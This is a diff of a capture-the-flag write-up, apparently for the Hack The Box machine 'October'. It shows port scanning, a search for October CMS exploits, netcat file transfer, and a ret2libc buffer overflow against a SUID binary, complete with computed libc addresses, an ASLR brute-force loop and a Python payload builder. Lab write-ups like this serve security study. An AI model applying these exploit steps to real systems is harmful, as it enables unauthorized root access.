@@ -17,11 +17,6 @@ MACHINE TAGS:
 * Binary Exploitation
 * Buffer Overflow
 * Default Credentials
-```
-
-
-
-```
 # nmap -p- -n -Pn -sC --min-rate 2000 -oA nmap/portscan -v 10.10.10.16
 PORT   STATE SERVICE
 22/tcp open  ssh
@@ -36,11 +31,6 @@ PORT   STATE SERVICE
 |   Supported Methods: GET HEAD POST PUT PATCH DELETE OPTIONS
 |_  Potentially risky methods: PUT PATCH DELETE
 |_http-title: October CMS - Vanilla
-```
-
-
-
-```
 $ searchsploit October
 --------------------------------------------------------------------
 October CMS - Upload Protection Bypass Code Execution (Metasploit) | php/remote/47376.rb
@@ -50,17 +40,7 @@ October CMS Build 465 - Arbitrary File Read Exploit (Authenticated) |�
 October CMS User Plugin 1.4.5 - Persistent Cross-Site Scripting | php/webapps/44546.txt
 OctoberCMS 1.0.425 (Build 425) - Cross-Site Scripting | php/webapps/42978.txt
 OctoberCMS 1.0.426 (Build 426) - Cross-Site Request Forgery | php/webapps/43106.txt
-```
-
-
-
-```
 https://bitflipper.eu/finding/2017/04/october-cms-v10412-several-issues.html
-```
-
-
-
-```
 'mysql' => [
     'driver'    => 'mysql',
     'host'      => 'localhost',
@@ -72,18 +52,8 @@ https://bitflipper.eu/finding/2017/04/october-cms-v10412-several-issues.html
     'collation' => 'utf8_unicode_ci',
     'prefix'    => '',
 ],
-```
-
-
-
-```
 $ nc -l -p 9901 > ovrflw # kali监听接收
 $ nc -w 5 10.10.17.64 9901 < /usr/local/bin/ovrflw
-```
-
-
-
-```
 gef➤  checksec
 [+] checksec for '/home/kali/hackthebox/October/file/pwn/ovrflw'
 Canary                        : ✘
@@ -91,11 +61,6 @@ NX                            : ✓
 PIE                           : ✘
 Fortify                       : ✘
 RelRO                         : Partial
-```
-
-
-
-```
 $ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -e " system@" -e " exit@"
    139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
   1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
@@ -103,44 +68,14 @@ $ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -e " system@" -e " 
 $ strings -atx /lib/i386-linux-gnu/libc.so.6 | grep "/bin/"
  162bac /bin/sh
  164b10 /bin/csh
-```
-
-
-
-```
 $ cat /proc/sys/kernel/randomize_va_space
 2
-```
-
-
-
-```
 'A' * 112 + system_plt + 0x0000000 + bin_sh_addr
-```
-
-
-
-```
 $ objdump -d -j .plt /usr/local/bin/ovrflw
-```
-
-
-
-```
 system: 0xb75f8000+0x40310 = 0xB7638310
 exit: 0xb75f8000+0x33260 = 0xB762B260
 /bin/sh: = 0xb75f8000+0x162bac = 0xB775ABAC
-```
-
-
-
-```
 $ while true; do /usr/local/bin/ovrflw $(python -c 'print "x90"*112 + "x10x83x63xb7" + "x60xb2x62xb7" + "xacxabx75xb7"'); done
-```
-
-
-
-```
 import struct
 
 system_addr = struct.pack("<I", 0xffffffff)
@@ -153,11 +88,6 @@ buf += exit_addr
 buf += arg_addr
 
 print buf
-```
-
-
-
-```
 from subprocess import call
 import struct
 
